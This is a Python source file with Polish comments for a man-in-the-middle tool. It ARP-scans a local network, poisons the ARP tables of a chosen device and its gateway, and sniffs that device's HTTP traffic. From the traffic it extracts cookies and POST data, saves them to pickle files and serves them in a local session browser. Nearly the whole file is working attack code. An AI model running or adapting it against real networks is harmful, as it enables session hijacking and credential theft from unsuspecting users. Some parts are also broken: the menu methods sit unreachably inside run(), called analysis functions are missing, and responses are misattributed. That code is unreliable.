from scapy.sendrecv import srp, send, sniff
from scapy.layers.http import HTTPRequest, HTTPResponse
import scapy.all as scapy
import netifaces
import os
import time
import subprocess
import threading
import http.server
import socketserver
import json
import pickle
from datetime import datetime
from domain_resolver import improve_url_identification
import gzip

class NetworkSniffer:
    def __init__(self):
        self.interfaces = self.get_interfaces()
        self.selected_interface = None
        self.devices = []
        self.selected_device = None
        self.captured_data = {}
        self.stop_sniffing = False
        self.sniffing_thread = None
        self.spoofing_thread = None
        self.gateway_ip = None
        self._test_scapy_imports()
        self.enable_ip_forwarding()

    def get_full_html_content(self, url):
        """
        Próbuje zebrać pełną zawartość HTML dla danego URL
        """
        try:
            # Znajdź wszystkie żądania i odpowiedzi dla danego URL
            html_responses = []
            for requests in self.captured_data.get(url, []):
                for response in requests.get('responses', []):
                    # Sprawdź, czy odpowiedź zawiera treść HTML
                    if response.get('headers', {}).get('Content-Type', '').startswith('text/html'):
                        html_responses.append(response['content'])

            # Zwróć pierwszą znalezioną odpowiedź HTML lub pustą treść
            return html_responses[0] if html_responses else "<html><body>Nie znaleziono treści HTML</body></html>"

        except Exception as e:
            print(f"Błąd podczas pobierania treści HTML: {e}")
            return "<html><body>Błąd podczas ładowania strony</body></html>"

    def save_captured_data(self):
        """Zapisuje przechwycone dane do pliku"""
        if not self.captured_data:
            print("Brak danych do zapisania.")
            return False

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"captured_data_{timestamp}.pickle"

        # Dodaj statystyki
        url_count = len(self.captured_data)
        request_count = sum(len(requests) for requests in self.captured_data.values())

        print(f"\nPodsumowanie przechwytywania:")
        print(f"- Liczba unikalnych URL/hostów: {url_count}")
        print(f"- Łączna liczba żądań/pakietów: {request_count}")

        if url_count > 0:
            print("\nWykryte hosty/URL:")
            for i, url in enumerate(self.captured_data.keys()):
                req_count = len(self.captured_data[url])
                protocol = "HTTPS" if url.startswith("https://") else "HTTP"
                print(f"  {i + 1}. {protocol} {url} ({req_count} żądań/pakietów)")

        try:
            with open(filename, 'wb') as f:
                pickle.dump(self.captured_data, f)

            print(f"\nDane zapisane w pliku: {filename}")
            return True
        except Exception as e:
            print(f"Błąd podczas zapisywania danych: {e}")
            return False

    def _test_scapy_imports(self):
        """Testuje czy wszystkie potrzebne funkcje z scapy są dostępne"""
        try:
            # Test funkcji srp
            if hasattr(scapy, 'srp'):
                print("Funkcja 'srp' jest dostępna w module scapy")
            else:
                print("UWAGA: Funkcja 'srp' NIE jest dostępna w module scapy!")
                print("Dostępne funkcje w module scapy:", dir(scapy)[:20])

            # Test funkcji sniff
            if hasattr(scapy, 'sniff'):
                print("Funkcja 'sniff' jest dostępna w module scapy")
            else:
                print("UWAGA: Funkcja 'sniff' NIE jest dostępna w module scapy!")

            # Test funkcji ARP
            if hasattr(scapy, 'ARP'):
                print("Klasa 'ARP' jest dostępna w module scapy")
            else:
                print("UWAGA: Klasa 'ARP' NIE jest dostępna w module scapy!")

            # Test funkcji Ether
            if hasattr(scapy, 'Ether'):
                print("Klasa 'Ether' jest dostępna w module scapy")
            else:
                print("UWAGA: Klasa 'Ether' NIE jest dostępna w module scapy!")

        except Exception as e:
            print(f"Błąd podczas testowania importów scapy: {e}")

    def enable_ip_forwarding(self):
        """Włącza przekazywanie pakietów IP (potrzebne dla ARP poisoning)"""
        try:
            if os.name == 'posix':  # Linux/Mac
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                print("Włączono przekazywanie pakietów IP.")
            elif os.name == 'nt':  # Windows
                os.system(
                    "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\" /v \"IPEnableRouter\" /t REG_DWORD /d 1 /f")
                print("Włączono przekazywanie pakietów IP. Może być wymagany restart.")
        except Exception as e:
            print(f"Nie udało się włączyć przekazywania pakietów IP: {e}")
            print("Przechwytywanie może nie działać prawidłowo.")

    def get_interfaces(self):
        """Pobiera listę dostępnych interfejsów sieciowych"""
        interfaces = []
        for iface in netifaces.interfaces():
            try:
                # Pobierz adres IP każdego interfejsu
                ifaddresses = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in ifaddresses:
                    ip = ifaddresses[netifaces.AF_INET][0]['addr']
                    interfaces.append({'name': iface, 'ip': ip})
            except Exception as e:
                print(f"Błąd podczas pobierania informacji o interfejsie {iface}: {e}")
        return interfaces

    def show_interfaces(self):
        """Wyświetla dostępne interfejsy sieciowe"""
        print("\n==== Dostępne interfejsy sieciowe ====")
        for i, iface in enumerate(self.interfaces):
            print(f"{i + 1}. {iface['name']} - {iface['ip']}")

        try:
            choice_input = input("\nWybierz interfejs (numer): ")
            choice = int(choice_input) - 1
            if 0 <= choice < len(self.interfaces):
                self.selected_interface = self.interfaces[choice]
                print(f"Wybrano interfejs: {self.selected_interface['name']}")
                return True
            else:
                print("Nieprawidłowy wybór. Numer poza zakresem.")
                return False
        except ValueError:
            print("Nieprawidłowy wybór. Wprowadź liczbę.")
            return False

    def scan_network(self):
        """Skanuje sieć lokalną w poszukiwaniu urządzeń"""
        if not self.selected_interface:
            print("Najpierw wybierz interfejs sieciowy.")
            return False

        print(f"\nSkanowanie sieci za pomocą {self.selected_interface['name']}...")

        # Utwórz adres sieci na podstawie adresu IP
        ip_parts = self.selected_interface['ip'].split('.')
        network_address = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"

        try:
            # Utwórz pakiet ARP
            arp_request = scapy.ARP(pdst=network_address)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request

            # Wyślij pakiet i odbierz odpowiedź
            print("Wysyłanie pakietów ARP, proszę czekać...")
            answered_list = srp(arp_request_broadcast, timeout=5, verbose=0, retry=2)[0]

            # Przetwórz odpowiedzi
            self.devices = []
            print(f"Znaleziono {len(answered_list)} urządzeń:")

            for element in answered_list:
                device = {
                    "ip": element[1].psrc,
                    "mac": element[1].hwsrc,
                    "hostname": "Unknown"
                }

                # Uproszczona próba uzyskania nazwy hosta bez używania nslookup
                try:
                    import socket
                    hostname = socket.getfqdn(device["ip"])
                    if hostname != device["ip"]:  # getfqdn czasem zwraca sam adres IP
                        device["hostname"] = hostname
                except:
                    pass

                self.devices.append(device)
                print(f"  * {device['ip']} ({device['mac']})")

            if not self.devices:
                print("Nie znaleziono żadnych urządzeń w sieci.")
                return False

            return True
        except Exception as e:
            print(f"Błąd podczas skanowania sieci: {e}")
            print("Sprawdź, czy masz uprawnienia administratora/roota do wykonania tego polecenia.")
            return False

    def show_devices(self):
        """Wyświetla znalezione urządzenia"""
        print("\n==== Znalezione urządzenia ====")
        for i, device in enumerate(self.devices):
            print(f"{i + 1}. IP: {device['ip']} - MAC: {device['mac']} - Nazwa: {device.get('hostname', 'Unknown')}")

        try:
            choice_input = input("\nWybierz urządzenie do monitorowania (numer): ")
            choice = int(choice_input) - 1
            if 0 <= choice < len(self.devices):
                self.selected_device = self.devices[choice]
                print(f"Wybrano urządzenie: {self.selected_device['ip']}")
                return True
            else:
                print("Nieprawidłowy wybór. Numer poza zakresem.")
                return False
        except ValueError:
            print("Nieprawidłowy wybór. Wprowadź liczbę.")
            return False

    def packet_callback(self, packet):
        """Callback dla przechwyconych pakietów"""
        if self.stop_sniffing:
            return

        try:
            # Przechwytywanie żądań HTTP
            if packet.haslayer(HTTPRequest):
                # Pobierz URL
                try:
                    url = packet[HTTPRequest].Host.decode(errors='ignore') + packet[HTTPRequest].Path.decode(
                        errors='ignore')
                except:
                    url = "unknown-host/path"

                # Pobierz metodę HTTP
                try:
                    method = packet[HTTPRequest].Method.decode(errors='ignore')
                except:
                    method = "UNKNOWN"

                # Pobierz nagłówki
                headers = {}
                for field in packet[HTTPRequest].fields:
                    if field not in ['Method', 'Path', 'Http-Version']:
                        try:
                            headers[field] = packet[HTTPRequest].fields[field].decode(errors='ignore')
                        except:
                            headers[field] = str(packet[HTTPRequest].fields[field])

                # Sprawdź czy są ciasteczka
                cookies = {}
                if 'Cookie' in headers:
                    cookie_str = headers['Cookie']
                    cookie_parts = cookie_str.split(';')
                    for part in cookie_parts:
                        if '=' in part:
                            key, value = part.split('=', 1)
                            cookies[key.strip()] = value.strip()

                # Pobierz dane POST jeśli istnieją
                post_data = None
                if method == 'POST' and packet.haslayer(scapy.Raw):
                    post_data = packet[scapy.Raw].load.decode(errors='ignore')

                # Pobierz IP
                if packet.haslayer(scapy.IP):
                    src_ip = packet[scapy.IP].src
                    dst_ip = packet[scapy.IP].dst
                else:
                    src_ip = dst_ip = "unknown"

                # Timestamp
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                # Utwórz wpis żądania
                request_data = {
                    'timestamp': timestamp,
                    'method': method,
                    'url': url,
                    'headers': headers,
                    'cookies': cookies,
                    'post_data': post_data,
                    'protocol': 'HTTP',
                    'src_ip': src_ip,
                    'dst_ip': dst_ip,
                    'responses': []  # Lista na odpowiedzi
                }

                # Dodaj do przechwyconych danych
                if url not in self.captured_data:
                    self.captured_data[url] = []

                self.captured_data[url].append(request_data)

            # Przechwytywanie odpowiedzi HTTP
            elif packet.haslayer(HTTPResponse):
                if packet.haslayer(scapy.Raw):
                    try:
                        # Nagłówki odpowiedzi
                        response_headers = {}
                        for field in packet[HTTPResponse].fields:
                            try:
                                response_headers[field] = packet[HTTPResponse].fields[field].decode(errors='ignore')
                            except:
                                response_headers[field] = str(packet[HTTPResponse].fields[field])

                        # Treść odpowiedzi
                        # Treść odpowiedzi
                        raw_content = packet[scapy.Raw].load  # Surowe dane binarne

                        # Sprawdzenie, czy odpowiedź jest skompresowana gzipem
                        if 'Content-Encoding' in response_headers and 'gzip' in response_headers[
                            'Content-Encoding'].lower():
                            try:
                                response_content = gzip.decompress(raw_content).decode('utf-8', errors='replace')
                                print("Odpowiedź była skompresowana gzipem, została zdekompresowana.")
                            except Exception as e:
                                print(f"Błąd dekompresji: {e}")
                                response_content = raw_content  # W razie błędu zwróć oryginalne dane
                        else:
                            response_content = raw_content.decode(
                                errors='backslashreplace')  # Standardowy dekodowany tekst

                        # Dodaj odpowiedź do ostatniego żądania
                        for url, requests in self.captured_data.items():
                            for request in requests:
                                # Dodaj odpowiedź do żądania
                                response_entry = {
                                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                                    'headers': response_headers,
                                    'content': response_content,
                                    'content_length': len(response_content)
                                }

                                request['responses'].append(response_entry)
                                print(f"Przechwycono odpowiedź HTTP dla {url}: {len(response_content)} bajtów")
                                break

                    except Exception as decode_err:
                        print(f"Błąd podczas dekodowania odpowiedzi: {decode_err}")

        except Exception as e:
            print(f"Błąd podczas analizy pakietu: {e}")
            import traceback
            traceback.print_exc()

    def reconstruct_page(self, url):
        """
        Rekonstruuje pełną stronę z przechwyconych zasobów

        Args:
            url (str): Główny adres URL strony

        Returns:
            dict: Słownik z rekonstruowaną stroną
        """
        if url not in self.captured_data:
            return None

        # Główny dokument HTML
        main_html = None
        stylesheets = []
        scripts = []

        # Sortuj żądania chronologicznie
        requests = sorted(self.captured_data[url], key=lambda x: x.get('timestamp', ''))

        for request in requests:
            # Sprawdź odpowiedzi
            for response in request.get('responses', []):
                content_type = response.get('content_type', '')

                # Główny dokument HTML
                if 'text/html' in content_type and not main_html:
                    main_html = response['content']

                # Arkusze stylów
                elif 'text/css' in content_type:
                    stylesheets.append({
                        'url': request['url'],
                        'content': response['content']
                    })

                # Skrypty JavaScript
                elif 'javascript' in content_type:
                    scripts.append({
                        'url': request['url'],
                        'content': response['content']
                    })

        # Rekonstrukcja strony
        if main_html:
            # Wstrzyknij style do HEAD
            style_tags = '\n'.join([
                f'<link rel="stylesheet" href="{s["url"]}">'
                for s in stylesheets
            ])
            main_html = main_html.replace('</head>', f'{style_tags}</head>')

            # Dołącz skrypty na końcu body
            script_tags = '\n'.join([
                f'<script src="{s["url"]}"></script>'
                for s in scripts
            ])
            main_html = main_html.replace('</body>', f'{script_tags}</body>')

        return {
            'html': main_html,
            'stylesheets': stylesheets,
            'scripts': scripts
        }

    def _sanitize_data(self, data):
        """Oczyszczanie danych z potencjalnie niebezpiecznych znaków"""
        import re
        if isinstance(data, str):
            # Usuń znaki sterujące i niepożądane sekwencje
            return re.sub(r'[\x00-\x1F\x7F]', '', data)
        return data

    def get_gateway_ip(self):
        """Pobiera adres IP bramy sieciowej"""
        try:
            # Próba 1: Użycie netifaces (najbardziej niezawodna metoda)
            try:
                if not self.selected_interface:
                    print("Nie wybrano interfejsu sieciowego.")
                    return None

                # Pobierz informacje o wybranym interfejsie
                gateways = netifaces.gateways()

                # Sprawdź domyślną bramę
                if 'default' in gateways and netifaces.AF_INET in gateways['default']:
                    gateway_ip, interface = gateways['default'][netifaces.AF_INET]
                    # Sprawdź, czy to brama dla wybranego interfejsu
                    if interface == self.selected_interface['name']:
                        print(f"Wykryto bramę sieciową: {gateway_ip} dla interfejsu {interface}")
                        return gateway_ip

                # Jeśli nie znaleziono domyślnej bramy dla wybranego interfejsu,
                # poszukaj bramy specyficznej dla interfejsu
                interface_name = self.selected_interface['name']
                if interface_name in gateways:
                    for gateway_info in gateways[interface_name]:
                        if gateway_info[1] == interface_name and gateway_info[2]:  # Jeśli jest domyślna
                            print(f"Wykryto bramę sieciową: {gateway_info[0]} dla interfejsu {interface_name}")
                            return gateway_info[0]

                # Próba 2: Oblicz prawdopodobną bramę na podstawie adresu IP i maski
                # Typowo brama to pierwszy adres w sieci lub ostatni
                try:
                    ip_parts = self.selected_interface['ip'].split('.')
                    # Typowa brama dla sieci domowej to x.x.x.1 lub x.x.x.254
                    gateway_guess = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
                    print(f"Nie wykryto bramy automatycznie. Używam domyślnej dla sieci domowej: {gateway_guess}")
                    return gateway_guess
                except:
                    pass

            except Exception as e:
                print(f"Błąd podczas wykrywania bramy za pomocą netifaces: {e}")

            # Próba 3: Użycie poleceń systemowych jako fallback
            if os.name == 'posix':  # Linux/Mac
                # Różne polecenia dla Linuxa
                commands = [
                    "ip route | grep default | awk '{print $3}'",
                    "route -n | grep '^0.0.0.0' | awk '{print $2}'",
                    "netstat -rn | grep '^0.0.0.0' | awk '{print $2}'"
                ]

                for cmd in commands:
                    try:
                        gw = os.popen(cmd).read().strip()
                        if gw and len(gw) > 0:
                            print(f"Wykryto bramę sieciową: {gw}")
                            return gw
                    except:
                        continue

            elif os.name == 'nt':  # Windows
                try:
                    # Bardziej niezawodna metoda dla Windows
                    output = subprocess.check_output('ipconfig', text=True)
                    for line in output.split('\n'):
                        if 'Default Gateway' in line:
                            gw = line.split(':')[-1].strip()
                            if gw and gw != "" and not "Media disconnected" in line:
                                print(f"Wykryto bramę sieciową: {gw}")
                                return gw
                except:
                    pass

            # Próba 4: Pytanie użytkownika
            print("Nie udało się automatycznie wykryć bramy sieciowej.")
            gw = input("Podaj ręcznie adres IP bramy sieciowej (np. 192.168.1.1): ").strip()
            if gw:
                return gw

            return None
        except Exception as e:
            print(f"Nie udało się wykryć bramy sieciowej: {e}")
            print("Spróbuj określić adres bramy ręcznie.")
            gw = input("Podaj adres IP bramy sieciowej (np. 192.168.1.1): ").strip()
            return gw if gw else None

    def arp_spoof(self, target_ip, gateway_ip):
        """Przeprowadza ARP poisoning między urządzeniem docelowym a bramą sieciową"""
        target_mac = None
        gateway_mac = None

        # Pobierz adresy MAC
        for device in self.devices:
            if device['ip'] == target_ip:
                target_mac = device['mac']
            if device['ip'] == gateway_ip:
                gateway_mac = device['mac']

        if not target_mac:
            print(f"Nie znaleziono adresu MAC dla {target_ip}")
            # Próba pobrania MAC bezpośrednio
            target_mac = self.get_mac(target_ip)
            if not target_mac:
                return False

        if not gateway_mac:
            print(f"Nie znaleziono adresu MAC dla bramy {gateway_ip}")
            # Próba pobrania MAC bezpośrednio
            gateway_mac = self.get_mac(gateway_ip)
            if not gateway_mac:
                return False

        print(f"Rozpoczęcie ARP poisoning między {target_ip} a {gateway_ip}")

        try:
            while not self.stop_sniffing:
                # Stwórz pakiety dla warstwy Ethernet i ARP
                # Mów urządzeniu docelowemu, że jesteś bramą
                ether1 = scapy.Ether(dst=target_mac)
                arp1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                packet1 = ether1 / arp1

                # Mów bramie, że jesteś urządzeniem docelowym
                ether2 = scapy.Ether(dst=gateway_mac)
                arp2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                packet2 = ether2 / arp2

                # Wyślij pakiety
                send(packet1, verbose=0)
                send(packet2, verbose=0)

                time.sleep(2)  # Interwał wysyłania pakietów
        except Exception as e:
            print(f"Błąd podczas ARP poisoning: {e}")
        finally:
            # Przywróć prawidłowe wpisy ARP
            self.restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)

    def get_mac(self, ip):
        """Pobiera adres MAC dla podanego adresu IP"""
        try:
            ans, _ = srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
            return None
        except Exception as e:
            print(f"Błąd podczas pobierania adresu MAC dla {ip}: {e}")
            return None

    def restore_arp(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """Przywraca prawidłowe wpisy ARP po zakończeniu przechwytywania"""
        print("Przywracanie prawidłowych wpisów ARP...")
        try:
            for _ in range(5):  # Wysyłamy kilka pakietów dla pewności
                # Przywróć prawidłowy wpis dla urządzenia docelowego
                ether1 = scapy.Ether(dst=target_mac)
                arp1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
                packet1 = ether1 / arp1

                # Przywróć prawidłowy wpis dla bramy
                ether2 = scapy.Ether(dst=gateway_mac)
                arp2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
                packet2 = ether2 / arp2

                # Wyślij pakiety
                send(packet1, verbose=0)
                send(packet2, verbose=0)

                time.sleep(0.2)
        except Exception as e:
            print(f"Błąd podczas przywracania wpisów ARP: {e}")

    def start_sniffing(self):
        """Rozpoczyna przechwytywanie pakietów"""
        if not self.selected_device:
            print("Najpierw wybierz urządzenie.")
            return False

        print(f"\nRozpoczęcie przechwytywania ruchu dla {self.selected_device['ip']}...")

        # Spytaj użytkownika o tryb przechwytywania
        print("\nWybierz tryb przechwytywania:")
        print("1. Pasywne (tylko obserwacja pakietów urządzenia)")
        print("2. Aktywne (ARP poisoning - wymaga uprawnień administratora)")

        try:
            mode = input("Wybierz tryb (1/2): ").strip()

            self.stop_sniffing = False
            use_arp_spoofing = (mode == "2")

            # Jeśli użytkownik wybrał ARP poisoning
            if use_arp_spoofing:
                # Pobierz adres bramy, jeśli nie jest już znany
                if not self.gateway_ip:
                    self.gateway_ip = self.get_gateway_ip()

                if not self.gateway_ip:
                    print("Nie można przeprowadzić ARP poisoning bez adresu bramy.")
                    print("Przełączanie na tryb pasywny.")
                    use_arp_spoofing = False
                else:
                    # Uruchom wątek ARP spoofing
                    print(f"Rozpoczynanie ARP poisoning dla {self.selected_device['ip']}...")
                    self.spoofing_thread = threading.Thread(
                        target=self.arp_spoof,
                        args=(self.selected_device['ip'], self.gateway_ip)
                    )
                    self.spoofing_thread.daemon = True
                    self.spoofing_thread.start()

            # Funkcja do przechwytywania w osobnym wątku
            def sniff_thread():
                try:
                    # Jeśli używamy ARP poisoning, przechwytujemy wszystkie pakiety
                    if use_arp_spoofing:
                        filter_str = f"host {self.selected_device['ip']}"
                    else:
                        # Bardziej szczegółowy filtr dla portów HTTP i HTTPS
                        filter_str = f"host {self.selected_device['ip']} and tcp and (port 80 or port 443)"

                    print(f"Używany filtr: {filter_str}")
                    print(f"Rozpoczęto przechwytywanie ruchu. Wyniki będą wyświetlane na bieżąco.")
                    print(f"Oczekiwanie na pakiety...")

                    # Uruchom przechwytywanie
                    sniff(
                        filter=filter_str,
                        prn=self.packet_callback,
                        store=0,
                        stop_filter=lambda p: self.stop_sniffing
                    )
                except Exception as e:
                    print(f"Błąd podczas przechwytywania: {e}")
                    import traceback
                    traceback.print_exc()

            # Uruchomienie wątku przechwytywania
            self.sniffing_thread = threading.Thread(target=sniff_thread)
            self.sniffing_thread.daemon = True
            self.sniffing_thread.start()

            print("Wpisz 'st' i naciśnij Enter, aby zatrzymać przechwytywanie.")

            # Oczekiwanie na polecenie zatrzymania
            try:
                while True:
                    command = input("Wpisz 'st' aby zatrzymać przechwytywanie: ")
                    if command.lower().strip() == 'st':
                        break
                    time.sleep(0.5)
            finally:
                print("\nZatrzymywanie przechwytywania...")
                self.stop_sniffing = True

                # Zaczekaj na zakończenie wątków
                if self.sniffing_thread.is_alive():
                    self.sniffing_thread.join(timeout=2)

                if use_arp_spoofing and self.spoofing_thread and self.spoofing_thread.is_alive():
                    self.spoofing_thread.join(timeout=2)

                print("Przechwytywanie zatrzymane.")

                # Zapisz dane
                if self.captured_data:
                    self.save_captured_data()
                else:
                    print("Nie przechwycono żadnych danych.")

                return True

        except Exception as e:
            print(f"\nBłąd podczas przechwytywania: {e}")
            self.stop_sniffing = True

            # Zatrzymaj wątki
            if hasattr(self, 'sniffing_thread') and self.sniffing_thread and self.sniffing_thread.is_alive():
                self.sniffing_thread.join(timeout=2)

            if hasattr(self, 'spoofing_thread') and self.spoofing_thread and self.spoofing_thread.is_alive():
                self.spoofing_thread.join(timeout=2)

            return False

    def start_session_browser(self):
        """Uruchamia interaktywną przeglądarkę sesji na porcie 8000"""
        print("Uruchamianie interaktywnej przeglądarki sesji na porcie 8000...")

        if not self.captured_data or len(self.captured_data) == 0:
            print("Błąd: Brak danych do wyświetlenia.")
            return False

        try:
            # Utwórz pliki dla aplikacji przeglądarki sesji
            if not self.create_session_browser_app():
                print("Nie udało się utworzyć aplikacji przeglądarki sesji.")
                return False

            # Importy do serwera HTTP
            import http.server
            import socketserver

            # Utwórz klasę obsługującą żądania HTTP
            class SessionBrowserHandler(http.server.SimpleHTTPRequestHandler):
                def do_GET(self):
                    if self.path == '/':
                        self.path = '/session_browser_app.html'
                    elif self.path == '/data':
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.end_headers()
                        with open('temp_session_data.json', 'rb') as f:
                            self.wfile.write(f.read())
                        return

                    return http.server.SimpleHTTPRequestHandler.do_GET(self)

            # Uruchom serwer HTTP
            handler = SessionBrowserHandler
            with socketserver.TCPServer(("", 8000), handler) as httpd:
                print("Serwer uruchomiony na http://localhost:8000")
                print("Otwórz przeglądarkę i przejdź do adresu: http://localhost:8000")
                print("Naciśnij Ctrl+C, aby zatrzymać serwer")

                try:
                    # Otwórz przeglądarkę
                    try:
                        import webbrowser
                        webbrowser.open("http://localhost:8000")
                    except Exception as e:
                        print(f"Nie udało się automatycznie otworzyć przeglądarki: {e}")

                    # Uruchom serwer
                    httpd.serve_forever()
                except KeyboardInterrupt:
                    print("\nZatrzymywanie serwera...")
                except Exception as e:
                    print(f"\nBłąd podczas działania serwera: {e}")
                finally:
                    try:
                        httpd.shutdown()
                    except:
                        pass
                    # Usuń pliki tymczasowe
                    for temp_file in ['temp_session_data.json', 'session_browser_app.html']:
                        try:
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                        except Exception as e:
                            print(f"Nie udało się usunąć pliku {temp_file}: {e}")
                    print("Serwer zatrzymany.")
                    return True

        except Exception as e:
            print(f"Błąd podczas uruchamiania przeglądarki sesji: {e}")
            import traceback
            traceback.print_exc()
            return False

    def load_captured_data(self, filename):
        """Wczytuje przechwycone dane z pliku"""
        try:
            # Sprawdź czy plik istnieje
            if not os.path.isfile(filename):
                print(f"Błąd: Plik {filename} nie istnieje.")
                return False

            with open(filename, 'rb') as f:
                loaded_data = pickle.load(f)

            # Sprawdź czy dane mają prawidłowy format
            if not isinstance(loaded_data, dict):
                print(f"Błąd: Nieprawidłowy format danych w pliku {filename}.")
                return False

            self.captured_data = loaded_data

            # Wyświetl statystyki wczytanych danych
            url_count = len(self.captured_data)
            request_count = sum(len(requests) for requests in self.captured_data.values())

            print(f"Dane wczytane z pliku: {filename}")
            print(f"Liczba unikalnych URL: {url_count}")
            print(f"Łączna liczba żądań: {request_count}")

            return True
        except Exception as e:
            print(f"Błąd podczas wczytywania danych: {e}")
            print("Upewnij się, że plik jest prawidłowym plikiem danych wygenerowanym przez ten program.")
            return False

    def run(self):
        """Główna funkcja programu"""
        print("=== Narzędzie do przechwytywania i analizy ruchu sieciowego ===")

        while True:
            try:
                print("\nMenu główne:")
                print("1. Wybierz interfejs sieciowy")
                print("2. Skanuj sieć")
                print("3. Pokaż znalezione urządzenia")
                print("4. Rozpocznij przechwytywanie ruchu")
                print("5. Zarządzanie danymi")
                print("6. Analiza ruchu")
                print("7. Przeglądarka sesji")
                print("0. Wyjdź")

                try:
                    choice = input("\nWybierz opcję: ").strip()
                except (UnicodeDecodeError, KeyboardInterrupt):
                    print("\nNieprawidłowe wejście. Spróbuj ponownie.")
                    continue

                if choice == "1":
                    self.show_interfaces()
                elif choice == "2":
                    if self.selected_interface:
                        success = self.scan_network()
                        if success and self.devices:
                            self.show_devices()
                    else:
                        print("Najpierw wybierz interfejs sieciowy.")
                elif choice == "3":
                    if self.devices:
                        self.show_devices()
                    else:
                        print("Najpierw przeprowadź skanowanie sieci.")
                elif choice == "4":
                    if self.selected_device:
                        self.start_sniffing()
                    else:
                        print("Najpierw wybierz urządzenie.")
                elif choice == "5":
                    self.show_data_management_menu()
                elif choice == "6":
                    self.show_analysis_menu()
                elif choice == "7":
                    self.show_browser_menu()
                elif choice == "0":
                    print("Wyjście z programu.")
                    break
                else:
                    print("Nieprawidłowy wybór. Wybierz opcję od 0 do 7.")
            except KeyboardInterrupt:
                print("\n\nPrzerwano działanie. Czy chcesz wyjść z programu? (t/n): ", end="")
                try:
                    confirm = input().strip().lower()
                    if confirm == 't' or confirm == 'tak':
                        print("Wyjście z programu.")
                        break
                    else:
                        print("Kontynuowanie pracy.")
                except:
                    print("\nWyjście z programu.")
                    break
            except Exception as e:
                print(f"\nWystąpił nieoczekiwany błąd: {e}")
                import traceback
                traceback.print_exc()
                print("Kontynuowanie pracy...")

        def show_data_management_menu(self):
            """Wyświetla menu zarządzania danymi"""
            while True:
                print("\nZarządzanie danymi:")
                print("1. Zapisz przechwycone dane")
                print("2. Wczytaj dane z pliku")
                print("3. Połącz dane z wielu plików")
                print("4. Wyczyść bieżące dane")
                print("5. Eksportuj dane jako HTML")
                print("0. Powrót do menu głównego")

                try:
                    choice = input("\nWybierz opcję: ").strip()
                except (UnicodeDecodeError, KeyboardInterrupt):
                    print("\nNieprawidłowe wejście. Spróbuj ponownie.")
                    continue

                if choice == "1":
                    self.save_captured_data()
                elif choice == "2":
                    try:
                        filename = input("Podaj nazwę pliku: ").strip()
                        if filename:
                            self.load_captured_data(filename)
                        else:
                            print("Nie podano nazwy pliku.")
                    except (UnicodeDecodeError, KeyboardInterrupt):
                        print("\nNieprawidłowe wejście. Operacja anulowana.")
                elif choice == "3":
                    try:
                        filenames_input = input("Podaj nazwy plików (oddzielone przecinkiem): ").strip()
                        if filenames_input:
                            filenames = [f.strip() for f in filenames_input.split(',')]
                            self.merge_sessions(filenames)
                        else:
                            print("Nie podano nazw plików.")
                    except (UnicodeDecodeError, KeyboardInterrupt):
                        print("\nNieprawidłowe wejście. Operacja anulowana.")
                elif choice == "4":
                    try:
                        confirm = input("Czy na pewno chcesz wyczyścić wszystkie dane? (t/n): ").strip().lower()
                        if confirm == 't' or confirm == 'tak':
                            self.captured_data = {}
                            print("Dane zostały wyczyszczone.")
                        else:
                            print("Operacja anulowana.")
                    except (UnicodeDecodeError, KeyboardInterrupt):
                        print("\nNieprawidłowe wejście. Operacja anulowana.")
                elif choice == "5":
                    try:
                        filename = input("Podaj nazwę pliku HTML: ").strip()
                        if filename:
                            self.export_as_html(filename)
                        else:
                            print("Nie podano nazwy pliku.")
                    except (UnicodeDecodeError, KeyboardInterrupt):
                        print("\nNieprawidłowe wejście. Operacja anulowana.")
                elif choice == "0":
                    break
                else:
                    print("Nieprawidłowy wybór. Wybierz opcję od 0 do 5.")

        def show_analysis_menu(self):
            """Wyświetla menu analizy ruchu"""
            while True:
                print("\nAnaliza ruchu:")
                print("1. Przeprowadź pełną analizę ruchu")
                print("2. Znajdź problemy bezpieczeństwa")
                print("3. Znajdź problemy wydajności")
                print("4. Analizuj wzorce ruchu")
                print("5. Generuj raport analizy")
                print("0. Powrót do menu głównego")

                try:
                    choice = input("\nWybierz opcję: ").strip()
                except (UnicodeDecodeError, KeyboardInterrupt):
                    print("\nNieprawidłowe wejście. Spróbuj ponownie.")
                    continue

                if choice == "1":
                    if self.captured_data:
                        self.analyze_traffic()
                    else:
                        print("Brak danych do analizy.")
                elif choice == "2":
                    if self.captured_data:
                        self.analyze_security_issues()
                    else:
                        print("Brak danych do analizy.")
                elif choice == "3":
                    if self.captured_data:
                        self.analyze_performance_issues()
                    else:
                        print("Brak danych do analizy.")
                elif choice == "4":
                    if self.captured_data:
                        self.analyze_traffic_patterns()
                    else:
                        print("Brak danych do analizy.")
                elif choice == "5":
                    if self.captured_data:
                        filename = input("Podaj nazwę pliku raportu: ").strip()
                        if filename:
                            self.generate_analysis_report(filename)
                        else:
                            print("Nie podano nazwy pliku.")
                    else:
                        print("Brak danych do analizy.")
                elif choice == "0":
                    break
                else:
                    print("Nieprawidłowy wybór. Wybierz opcję od 0 do 5.")

        def show_browser_menu(self):
            """Wyświetla menu przeglądarki sesji"""
            while True:
                print("\nPrzeglądarka sesji:")
                print("1. Uruchom standardową przeglądarkę sesji")
